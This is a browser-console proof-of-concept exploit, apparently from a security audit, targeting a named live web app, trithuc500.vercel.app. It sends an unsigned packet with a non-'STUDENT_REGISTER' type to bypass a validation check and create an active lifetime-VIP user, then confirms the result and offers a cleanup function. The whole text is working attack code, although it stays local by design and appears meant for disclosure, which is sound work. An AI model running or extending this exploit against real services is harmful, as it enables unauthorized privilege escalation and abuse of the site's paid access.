/* NEW-02 — real Chrome, LOCAL-ONLY proof
 * ================================================================
 * Prereq: aero_hook_v3.user.js installed in Tampermonkey/Violentmonkey
 *         and the page reloaded (console shows "[Aero] ... v3 ready").
 * Run:    paste this whole block into DevTools Console on
 *         https://trithuc500.vercel.app/
 *
 * Effect: inserts ONE synthetic ACTIVE + LIFETIME-VIP user into THIS
 *         browser profile only, using an unsigned packet whose type is
 *         deliberately NOT 'STUDENT_REGISTER' (the NEW-02 root cause).
 *
 * NO ntfy publish. NO KV write. NO real user read/modified.
 * NO password of any real account is accessed or printed.
 * Cleanup function is exposed at the end.
 */
(() => {
  'use strict';

  const P = window.__AERO_POC__;
  if (!P || P.version !== '3.0-userscript') {
    console.error('[NEW-02] v3 hook chưa sẵn. Cài aero_hook_v3.user.js rồi reload trang.');
    return { ok: false, reason: 'v3 hook missing' };
  }

  const NAME = 'poc_new02_' + String(Date.now()).slice(-6);

  // Unsigned, non-admin, non-STUDENT_REGISTER packet.
  // processIncomingCloudPacket only downgrades to pending/no-VIP when
  // data.type === 'STUDENT_REGISTER'; every other type keeps caller-supplied
  // st/vp/pl → active VIP user is accepted (lines 3204-3211).
  const packet = P.makeNew02Packet({
    type: 'LOCAL_POC_NEW02',          // <-- bypass trigger
    fromAdmin: false,                 // no admin claim
    // adminSig intentionally absent  // <-- no signature required
    users: [{
      id: 'stu_' + NAME,
      u: NAME,                        // username (compact field)
      p: 'SYNTHETIC_POC_ONLY',        // synthetic password, not real
      n: 'POC Synthetic',
      c: '12A1', s: '99',
      g: NAME + '@gmail.com', ph: '',
      st: 'active',                   // caller-controlled status
      vp: [1, 1, 1, 1],               // all 4 packages -> isVip true
      rp: [1, 0, 0, 0],
      pl: 'lifetime',                 // caller-controlled VIP plan
      rpl: '1y', exp: null, pend: 0, newReg: 0,
      maxD: 999, devs: [],
      regAt: 'POC', updAt: Date.now(), v436: 1
    }]
  });

  const beforeCount = P.users().length;
  const changed = P.applyLocal(packet);   // -> processIncomingCloudPacket (LOCAL ONLY)
  const after = P.users();
  const hit = after.find(u => u.u === NAME);

  console.table([{
    changed,
    before_users: beforeCount,
    after_users: after.length,
    injected_found: !!hit,
    status: hit && hit.st,
    vip_flags: hit && Array.isArray(hit.vp) ? hit.vp.join('') : null,
    vip_plan: hit && hit.pl,
    packet_type: packet.type,
    fromAdmin: packet.fromAdmin,
    has_adminSig: Object.prototype.hasOwnProperty.call(packet, 'adminSig')
  }]);

  const confirmed = !!(hit && hit.st === 'active' && hit.pl === 'lifetime');
  console.log(confirmed
    ? '[NEW-02] CONFIRMED (LOCAL): unsigned packet created ACTIVE LIFETIME-VIP user.'
    : '[NEW-02] NOT CONFIRMED — inspect the table above.');

  // Local cleanup: remove only the synthetic user from this browser's storage.
  window.__AERO_NEW02_CLEANUP__ = function () {
    const KEY = 'TRITHUC50_USERS_V436_CLEAN';
    const raw = localStorage.getItem(KEY);
    if (!raw) return console.log('[NEW-02] no local users key; nothing to clean');
    const users = JSON.parse(raw).filter(u => u.username !== NAME);
    localStorage.setItem(KEY, JSON.stringify(users));
    console.log('[NEW-02] synthetic user removed. Press F5 to reload clean state.');
    return true;
  };
  console.log('[NEW-02] Dọn dẹp: chạy __AERO_NEW02_CLEANUP__() rồi F5.');

  return {
    ok: confirmed,
    username: NAME,
    changed,
    note: 'LOCAL_CONFIRMED only. No packet was published to ntfy/KV; cross-client effect stays UNVERIFIED.'
  };
})();
